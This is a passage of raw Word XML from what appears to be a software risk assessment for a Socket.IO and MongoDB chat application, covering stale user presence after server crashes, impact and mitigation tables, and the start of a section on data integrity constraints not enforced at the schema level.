          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> by the server, even though their browser tabs remain open. 4. Status change broadcasts (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>user status change: offline</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">) are </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>not sent</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> because the server has no record of the previous connections. 5. Other users see stale presence data until the affected users refresh their pages and trigger new </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>setup</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> events. 6. The database retains the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>last known status</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> from before the crash, which may be </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>online</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> or </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>away</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>, creating an inconsistency between database and server state.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>4.4 Impact Assessment</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:type="auto" w:w="0"/>
        <w:jc w:val="left"/>
        <w:tblLayout w:type="autofit"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4680"/>
        <w:gridCol w:w="4680"/>
      </w:tblGrid>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4680"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="2C3E50" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="18"/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Impact Factor</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4680"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="2C3E50" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="18"/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Severity</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4680"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Data Loss</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4680"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>None (messages are persisted in MongoDB)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4680"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="F8F9FA" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>User Experience</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4680"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="F8F9FA" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Degraded (stale presence, phantom "online" users)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4680"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Recovery Time</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4680"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Automatic (users reconnect on next page interaction)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4680"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="F8F9FA" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Frequency</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4680"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="F8F9FA" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Low (server crashes are infrequent in development)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>4.5 Current Mitigation</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">- Socket.IO clients automatically attempt to reconnect when a connection is lost, which triggers a new </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>setup</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> event and repopulates the presence registry. - The database </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>status</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> field is updated asynchronously, providing a fallback for presence queries.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>4.6 Recommended Mitigation</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:type="auto" w:w="0"/>
        <w:jc w:val="left"/>
        <w:tblLayout w:type="autofit"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3120"/>
        <w:gridCol w:w="3120"/>
        <w:gridCol w:w="3120"/>
      </w:tblGrid>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="2C3E50" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="18"/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Mitigation</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="2C3E50" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="18"/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Priority</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="2C3E50" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="18"/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Effort</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Migrate presence data to Redis with TTL-based auto-expiry</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>High</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>High</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="F8F9FA" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve">Implement graceful shutdown handler to broadcast </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="C0392B"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>offline</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve"> for all users</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="F8F9FA" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Medium</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="F8F9FA" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Low</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve">Add client-side reconnection logic that re-emits </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="C0392B"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>setup</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve"> on reconnect</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Medium</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Low</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="F8F9FA" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Implement periodic presence heartbeat to detect and clean stale entries</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="F8F9FA" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Medium</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="F8F9FA" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Medium</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>5. Risk Area 4: Data Integrity &amp; Consistency Constraints</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Severity: 🟡 MEDIUM</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>5.1 Identification</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">Several critical data integrity invariants are enforced at the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>application level</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> rather than at the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>database schema level</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>, making them vulnerable to bypass through direct database manipulation, bugs, or incomplete error handling.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>5.2 Evidence</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Vulnerability A — `readBy ⊆ deliveredTo` Invariant Not Schema-Enforced:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">The system design specifies that a message can only be in the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>readBy</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> set if it is also in the </w:t>
      </w:r>
